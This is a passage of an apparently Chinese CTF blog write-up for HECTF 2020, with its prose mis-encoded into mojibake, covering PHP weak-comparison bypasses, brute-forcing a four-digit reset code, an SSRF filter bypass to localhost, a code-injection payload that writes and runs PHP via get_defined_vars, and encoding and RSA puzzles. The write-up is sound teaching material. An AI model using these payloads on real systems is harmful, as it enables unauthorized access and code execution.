å¯†åï¼Œé™¤å¼€å¤´çš„<code>ce</code>å¤–ï¼Œå‰©ä¸‹éƒ¨åˆ†åªèƒ½æ˜¯æ•°å­—å’Œå­—æ¯cxhp</p><p>å†™è„šæœ¬è¿›è¡Œç­›é€‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">10000000</span>; $i++) &#123;</span><br><span class="line">$a = md5($i);</span><br><span class="line"><span class="keyword">if</span>(substr($a, <span class="number">0</span>, <span class="number">2</span>) == <span class="string">&#x27;ce&#x27;</span>) &#123;</span><br><span class="line">$end = substr($a, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[^0-9cxhp]/&#x27;</span>, $end)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i=&quot;</span>.$i.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.$a.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D;9427417</span><br><span class="line">a&#x3D;ce156443c7c7c4c63366466c25317636</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥<code>str2=9427417</code></p><p>è”åˆèµ·æ¥å³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str1&#x3D;240610708&amp;str2&#x3D;9427417&amp;param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/21/D3aJdU.png" alt="D3aJdU.png"></p><br><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>é¢˜ç›®ï¼šç™»å½•å°±é€flag~</p><p>hintï¼šbrute force</p><p><img src="https://s3.ax1x.com/2020/11/21/D3aDL6.png"></p><p>éšä¾¿è¾“ä¸ªæ‰‹æœºå·å’Œå¯†ç ï¼Œæç¤ºæ‰‹æœºæˆ–å¯†ç é”™è¯¯ï¼ŒæŸ¥çœ‹æºç å‘ç°æ‰‹æœºå·ï¼š<code>15970773575</code></p><p><img src="https://s3.ax1x.com/2020/11/21/D3ajln.png"></p><p>ç‚¹å‡»<code>å¿˜è®°å¯†ç </code>ï¼Œæ ¹æ®é¢˜ç›®hintï¼Œä½¿ç”¨æš´åŠ›ç ´è§£</p><p><img src="https://s3.ax1x.com/2020/11/21/D3dtnP.png"></p><p>ç”¨è„šæœ¬ç”Ÿæˆ4ä½çº¯æ•°å­—çš„éªŒè¯ç </p><ul><li>4num.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0000</span>,<span class="number">9999</span>):</span><br><span class="line">    s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;4num.txt&#x27;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(str(s) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>ç”¨burp suiteæŠ“åŒ…ï¼Œä½¿ç”¨çˆ†ç ´æ¨¡å—è¿›è¡Œçˆ†ç ´ï¼Œå…¶ä¸­<code>0233</code>çš„é•¿åº¦å’Œå…¶å®ƒæ˜æ˜¾ä¸åŒ</p><p><img src="https://s3.ax1x.com/2020/11/21/D3dgBV.png"></p><p>å°è¯•åå‘ç°ä¸ºæ­£ç¡®çš„éªŒè¯ç ï¼Œé‡è®¾å¯†ç åé‡æ–°ç™»å½•å³å¯æ‹¿åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;a9a102c0c06fcf6c8072c30f0a52f1f2&#125;</span><br></pre></td></tr></table></figure><br><h3 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h3><p>é¢˜ç›®ï¼šç»•è¿‡äººæµ·ï¼Œèµ°è¿›æœåŠ¡å™¨å†…å¿ƒçš„ä¸–ç•Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//try flag.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$url</span>) </span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter($url))&#123;</span><br><span class="line">     <span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.getflag.cn/2020/10/22/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/">ã€è½¬è½½ã€‘æµ…è°ˆssrfä¸ctfé‚£äº›äº‹ | kawhiâ€™s Blog (getflag.cn)</a></p><p><img src="https://s3.ax1x.com/2020/11/21/D3w5a8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/21/D3w7GQ.png"></p><br><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦"><a href="#ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦" class="headerlink" title="ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦~"></a>ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦~</h3><p>é¢˜ç›®ï¼šå‰å¾€ç›´æ’­é—´ï¼Œ<del>è°ƒæˆå°è“è“</del>è·å–flagã€‚</p><p>flagåœ¨ç›´æ’­å±å¹•é‡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;ç‹®è™èŒè½»ä¸€ç‚¹æ‰“å‡ºé¢˜äººå¥½å—å˜¤å˜¤å˜¤&#125;</span><br></pre></td></tr></table></figure><br><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>é¢˜ç›®ï¼šå¥½å¯çˆ±çš„å°çŒ«å’ªé¸­~</p><p>ä¸‹è½½åæ˜¯ä¸€å¼ å›¾ç‰‡ï¼š<code>flag.png</code></p><p>æ‹–åˆ°010 Editoré‡Œï¼Œåœ¨æœ«å°¾å‘ç°è¿™ä¸ª</p><p><img src="https://s3.ax1x.com/2020/11/22/D8bYa6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M2I3OWJkZjhmY2ZkNTVmZH0&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£å¯†åå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3b79bdf8fcfd55fd&#125;</span><br></pre></td></tr></table></figure><p>å·®äº†å‰åŠæ®µï¼Œå°è¯•è°ƒæ•´å›¾ç‰‡é«˜åº¦ï¼Œå°†<code>02 BC</code>æ”¹ä¸º<code>04 20</code></p><p><img src="https://s3.ax1x.com/2020/11/22/D8bILn.png"></p><p>åœ¨å›¾ç‰‡æœ€ä¸‹çœ‹åˆ°å‰åŠæ®µçš„flag</p><p><img src="https://s3.ax1x.com/2020/11/22/D8qy6J.png"></p><p>åˆèµ·æ¥å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;94ed7fdae8f504743b79bdf8fcfd55fd&#125;</span><br></pre></td></tr></table></figure><br><h3 id="ä¸è¯´äººè¯"><a href="#ä¸è¯´äººè¯" class="headerlink" title="ä¸è¯´äººè¯"></a>ä¸è¯´äººè¯</h3><p>é¢˜ç›®ï¼šé˜´é˜³æ€ªæ°”ï¼Ÿï¼</p><p>ä½¿ç”¨<a href="https://www.splitbrain.org/services/ook">Ookç¼–è§£ç åœ¨çº¿å·¥å…·</a>ï¼Œå¾—åˆ°flag</p><p><img src="https://s3.ax1x.com/2020/11/22/D8OrL9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;TH1s_1s_crypt0_914nda0&#125;</span><br></pre></td></tr></table></figure><br><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw">https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw</a></p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>é¢˜ç›®ï¼šSunnedæ˜¯ä¸€ä¸ªlinuxå°ç™½ï¼Œçªç„¶æœ‰ä¸€å¤©æƒ³å­¦æ¸—é€ï¼Œå¥¹è¯·æ•™äº†æŸå¤§ä½¬ï¼Œå¤§ä½¬è¯´ï¼Œé¦–å…ˆçš„ä½ å¾—å…ˆå­¦ä¼šæ­å»ºç¯å¢ƒï¼Œç„¶åï¼Œç„¶åï¼ŒSunnedå°±è·Ÿç€ç½‘ä¸Šçš„æ•™ç¨‹å…ˆæ­å»ºäº†ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œæ­å»ºå¥½ä¹‹åå¤§ä½¬ç»™å¥¹ä¸Šäº†ä¸€ä¸ªé¢˜ç›®ã€‚</p><p>hintï¼šä¸€ä¸ªå°å§‘å¨˜èµ°ä¸¢äº†ï¼Œå¥¹çš„å®¶äººæ‹…å¿ƒåœ°åˆ°å¤„æ‰¾ï¼Œä¸€è¾¹æ‰¾ä¸€è¾¹å–Šï¼šè´ä¸ï¼ä½ åœ¨å“ªï¼Ÿï¼Ÿ L2V0Yy9jcm9udGFi</p><p>æŸ¥çœ‹æºç å‘ç°</p><p><img src="https://s3.ax1x.com/2020/11/21/D3wXq0.png"></p><p>phpå¼±ç±»å‹æ¯”è¾ƒé—®é¢˜ï¼Œåˆ©ç”¨md5ä¸èƒ½åŠ å¯†æ•°ç»„ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You need the file is .&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php</span><br></pre></td></tr></table></figure><p>è®¿é—®è¯¥è·¯å¾„</p><p><img src="https://s3.ax1x.com/2020/11/22/D30ks1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">@$data&#x3D;$_POST[&#39;data&#39;];</span><br><span class="line">$file&#x3D;$_POST[&#39;file&#39;];</span><br><span class="line">if($file!&#x3D;&quot;&#x2F;xxx&quot;)</span><br><span class="line">die(&quot;ä½ éœ€è¦çŸ¥é“å†™å…¥çš„æ–‡ä»¶åï¼ï¼ï¼ï¼ï¼æˆ‘çŒœä½ çŸ¥é“åˆ°è¿™ä¸ªæ–‡ä»¶å«ä»€ä¹ˆ,è®°å¾—åŠ ä¸Šç»å¯¹è·¯å¾„&quot;);</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $data)) &#123;</span><br><span class="line">echo &quot;great!!!!ä½ éœ€è¦çœ‹çœ‹æºç &quot;;</span><br><span class="line">file_put_contents($file,&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ä½ éœ€è¦çŸ¥é“å†™å…¥çš„æ–‡ä»¶åï¼ï¼ï¼ï¼ï¼æˆ‘çŒœä½ çŸ¥é“åˆ°è¿™ä¸ªæ–‡ä»¶å«ä»€ä¹ˆ,è®°å¾—åŠ ä¸Šç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºçš„<code>L2V0Yy9jcm9udGFi</code>ï¼Œè¿›è¡Œbase64è§£ç ï¼Œå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><p>è®¿é—®è¯¥è·¯å¾„</p><p><img src="https://s3.ax1x.com/2020/11/22/D30ZdK.png"></p><p>å°è¯•ä¼ å‚ï¼Œå¹¶è®¿é—®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;phpinfo();&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/22/D30GeP.png"></p><p>get_defined_vars() ä¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(4) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;_GET&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_POST&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_COOKIE&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_FILES&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;eval(pos(next(get_defined_vars())));&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php</span><br></pre></td></tr></table></figure><blockquote><p>æˆ–ï¼š</p><p>data=eval(end(current(get_defined_vars())));&amp;file=/very_g00d_Y0u_got_it.php</p></blockquote><p><img src="https://s3.ax1x.com/2020/11/22/D8fMgx.png"></p><p><img src="https://s3.ax1x.com/2020/11/24/DUeG5R.png"></p><p>æ‰§è¡Œå‘½ä»¤</p><p><img src="https://s3.ax1x.com/2020/11/24/DUmKJI.png"></p><blockquote><p><code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code> base64è§£å¯†åä¸º <code>fl4ggggggggggggCg</code></p><p>ä¹Ÿå¯ä»¥è¯»å–<code>3b8cf4731c36d20776c76e20f9c774c7.php</code>ï¼Œä»æ³¨é‡ŠçŸ¥é“flagæ‰€åœ¨æ–‡ä»¶</p></blockquote><p>è¯»å–<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>ï¼Œå¾—åˆ°flag</p><p><img src="https://s3.ax1x.com/2020/11/24/DUm6w4.png"></p><ul><li><code>3b8cf4731c36d20776c76e20f9c774c7.php</code></li></ul><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">@$data=$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$file=$_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;/xxx&quot;</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;ä½ éœ€è¦çŸ¥é“å†™å…¥çš„æ–‡ä»¶åï¼ï¼ï¼ï¼ï¼æˆ‘çŒœä½ çŸ¥é“åˆ°è¿™ä¸ªæ–‡ä»¶å«ä»€ä¹ˆ,è®°å¾—åŠ ä¸Šç»å¯¹è·¯å¾„&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $data)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;great!!!!ä½ éœ€è¦çœ‹çœ‹æºç &quot;</span>;</span><br><span class="line">file_put_contents($file,<span class="string">&quot;&lt;?php &quot;</span>.\$data.<span class="string">&quot; ?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$data=$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$file=$_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;/very_g00d_Y0u_got_it.php&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä½ éœ€è¦çŸ¥é“å†™å…¥çš„æ–‡ä»¶åï¼ï¼ï¼ï¼ï¼æˆ‘çŒœä½ çŸ¥é“åˆ°è¿™ä¸ªæ–‡ä»¶å«ä»€ä¹ˆ,è®°å¾—åŠ ä¸Šç»å¯¹è·¯å¾„&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $data))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono &quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;great!!!!&quot;</span>;</span><br><span class="line">    @file_put_contents($file,<span class="string">&quot;&lt;?php &quot;</span>.$data.<span class="string">&quot; ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//ä½ æƒ³è¦çš„æ–‡ä»¶æ˜¯   Zmw0Z2dnZ2dnZ2dnZ2dnCg</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure><br><h3 id="åœ¨è¿™é‡Œç­¾åˆ°"><a href="#åœ¨è¿™é‡Œç­¾åˆ°" class="headerlink" title="åœ¨è¿™é‡Œç­¾åˆ°"></a>åœ¨è¿™é‡Œç­¾åˆ°</h3><p>é¢˜ç›®ï¼šç»å…¸å¥—å¨ƒ æœ‰æ‰‹å°±â€¦</p><ul><li>enc.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18DxoLgtTzVee++9JZw790ngjGfxdjjjeWt9m9jL2O3NJuKB&#x2F;&#x2F;4O3BHTnelg2z+o2vE0AxVKPobIFVgKxqbpkr94XYPNZFbbFykHWBMArdVT8FuH7dyvHDrLe7D35p654UEy2Yn0FepbJ7BHcn9Gu9xg7eqVcovB6KfMivcXw49JyZWbWtb0SZKpA0hRgI2tNeQ8lsRZRkoaI9CECyphItxLd0bO58phQjv70M&#x2F;e30tsFpEmPo&#x3D;</span><br></pre></td></tr></table></figure><p>rabbitè§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1E0RElOSlVHTTJUSU5CV0c1QkRHTkJUR01aVFFOUlRHWTJER05SVEdVWlRJTlJVR1laVEdPQlRHVTNES05SVkdZWlRHTkpUR0kzREdOUlZHWTJETU1KV0dJWlRJTVpaR1kyREdNWldHUVpURU5SV0dNM1RNTkpXR0UzVUk9PT0&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GQ4DINJUGM2TINBWG5BDGNBTGMZTQNRTGY2DGNRTGUZTINRUGYZTGOBTGU3DKNRVGYZTGNJTGI3DGNRVGY2DMMJWGIZTIMZZGY2DGMZWGQZTENRWGM3TMNJWGE3UI&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base32è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48454354467B34333863643635346463383565656335326365646162343964336432663765617D</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;438cd654dc85eec52cedab49d3d2f7ea&#125;</span><br></pre></td></tr></table></figure><br><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>é¢˜ç›®ï¼šRRRRRRRSSSSSSSSAAAAAAA<del>~</del></p><ul><li>rsa.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ†è§£pã€qï¼Œä½¿ç”¨<a href="http://factordb.com/%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">http://factordb.com/åœ¨çº¿è§£å¯†</a></p><p><img src="https://s3.ax1x.com/2020/11/25/DUnK74.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span></span><br><span class="line">p = <span class="number">2499568793</span></span><br><span class="line">q = <span 